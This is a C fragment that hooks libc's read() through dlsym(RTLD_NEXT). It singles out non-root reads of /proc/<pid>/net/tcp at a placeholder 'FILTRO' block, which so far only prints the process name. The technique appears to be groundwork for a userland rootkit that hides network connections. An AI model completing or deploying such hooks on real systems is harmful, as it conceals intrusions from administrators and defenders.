
static ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;

ssize_t read (int fd, void *buf, size_t count){

    if(original_read == NULL) {                                    
        original_read = dlsym(RTLD_NEXT, "read");                
        if(original_read == NULL)                                  
        {                                                               
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         
        }                                                               
    } 

    char pid_string[256];
    char filename[256];
    char tmp[256];
    char pname[256];

    /*Obtiene el pid del proceso y lo guarda en pid_string*/
    get_process_pid(pid_string, sizeof(pid_string));
    snprintf(tmp, sizeof(tmp), "/proc/%s/net/tcp", pid_string);

    /*Traduce fd al nombre real del fichero, este se guarda en filename*/
    get_file_name(fd, filename, sizeof(filename));

    if(is_sudo() == 0 && strcmp(tmp, filename) == 0){
        /*FILTRO*/
        get_process_name(pid_string, pname);
        printf("%s\n", pname);
    }

    return original_read(fd, buf, count);
}